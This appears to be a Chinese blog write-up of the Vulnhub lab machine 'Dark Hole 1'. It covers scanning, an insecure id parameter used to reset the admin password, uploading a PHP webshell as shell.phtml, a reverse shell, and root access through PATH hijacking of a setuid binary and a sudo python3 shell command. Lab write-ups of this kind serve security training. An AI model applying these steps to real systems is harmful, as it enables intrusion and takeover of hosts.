---
layout: post
title: Dark Hole 1
subtitle: Dark Hole 1
date: 2023-07-14 16:49
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
  - Vulnhub
published: true
number headings: first-level 2, max 4, 1.1., auto
---

主机扫描，发现 ip `192.168.163.134`

![image.png](https://img.ghostliner.top/jfD8gH.png)

端口扫描，发现 80 和 22 端口

![image.png](https://img.ghostliner.top/rlHix8.png)

扫描目录

```shell
dirb http://192.168.163.134
nikto -h 192.168.163.134
```

发现目录：

```
http://192.168.163.134/config/
http://192.168.163.134/upload/
http://192.168.163.134/login.php
```

对站点进行指纹识别，无发现，bp 爆破用户名密码失败

尝试注册成功

登陆成功后地址为: <http://192.168.163.134/dashboard.php?id=2>

遍历页面 id 无效，只有一个页面，可以更改用户名、邮件和密码，sqlmap 测试密码时发现隐藏字段 id 参数，bp 遍历 id 尝试更改其他用户密码。

admin 登录成功，可以上传文件

上传一句话木马，经测试可以上传 `shell.phtml`

蚁剑连接，反弹 shell

![image.png](https://img.ghostliner.top/GvKSmS.png)

反弹成功，查看数据库未发现有效信息

![image.png](https://img.ghostliner.top/7dwDHN.png)

查看 john 家目录，发现特殊权限的 `toto`

![image.png](https://img.ghostliner.top/fyi8kc.png)

toto 疑似使用 `id`命令，更改环境变量修改为我们自定义的 `id`命令

```shell
echo '/bin/bash' > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
./toto
```

提权成功，获取到密码

![image.png](https://img.ghostliner.top/Wva3ra.png)

获取到 flag

![image.png](https://img.ghostliner.top/MtRwdk.png)

root 提权

![image.png](https://img.ghostliner.top/D6WblV.png)

```shell
echo 'import os;os.system("/bin/bash")' > file.py
sudo /usr/bin/python3 /home/john/file.py
```

root 提权成功，查看最终 flag

![image.png](https://img.ghostliner.top/Ifoh5M.png)
